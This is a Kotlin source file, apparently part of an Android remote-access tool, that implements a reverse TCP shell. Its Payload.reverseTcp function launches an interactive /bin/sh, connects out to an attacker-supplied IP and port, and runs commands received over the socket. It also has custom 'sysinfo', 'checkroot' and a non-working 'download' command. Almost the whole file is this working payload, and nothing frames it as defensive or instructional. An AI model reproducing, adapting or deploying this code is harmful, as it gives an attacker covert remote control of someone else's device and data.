package com.satwik.nexgenius.core.main

import com.satwik.nexgenius.core.main.customShellCommands.checkRoot
import com.satwik.nexgenius.core.main.customShellCommands.download
import com.satwik.nexgenius.core.main.customShellCommands.getSystemInfo
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.io.InputStream
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.Socket

object Payload {
    fun reverseTcp(ip: String, port: Int) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))

            val shellInput = process.inputStream
            val shellError = process.errorStream
            val shellOutput = process.outputStream

            Socket(ip, port).use { socket ->
                val socketInput = socket.getInputStream()
                val socketOutput = socket.getOutputStream()
                val socketReader = socketInput.bufferedReader()


                while (true) {
                    while (shellInput.available() > 0) {
                        socketOutput.write(shellInput.read())
                    }

                    while (shellError.available() > 0) {
                        socketOutput.write(shellError.read())
                    }

                    while (socketInput.available() > 0) {
                        val command = socketReader.readLine()
                        executeCommand(command, socketOutput, shellOutput, socket, process)
                    }
                    socketOutput.flush()
                    shellOutput.flush()
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}

fun executeCommand(command:String, socketOutput:OutputStream, shellOutput:OutputStream, socket:Socket, process: Process){
    when{
        (command == "sysinfo")-> {
            socketOutput.write((getSystemInfo() + "\n").toByteArray())
            shellOutput.write(("\n").toByteArray())
        }
        (command == "checkroot")->{
            socketOutput.write((checkRoot() + "\n").toByteArray())
            shellOutput.write(("\n").toByteArray())
        }
        (command == "exit")-> {
            socket.close()
            process.destroy()
            return
        }
        //Not Working
        (command.startsWith("download"))-> {
            val filepath = command.substringAfter("download ").trim()
            socketOutput.write((filepath +"\n").toByteArray())
            shellOutput.write(("\n").toByteArray())

        }
        else -> {
            shellOutput.write((command + "\n").toByteArray())
        }
    }
}





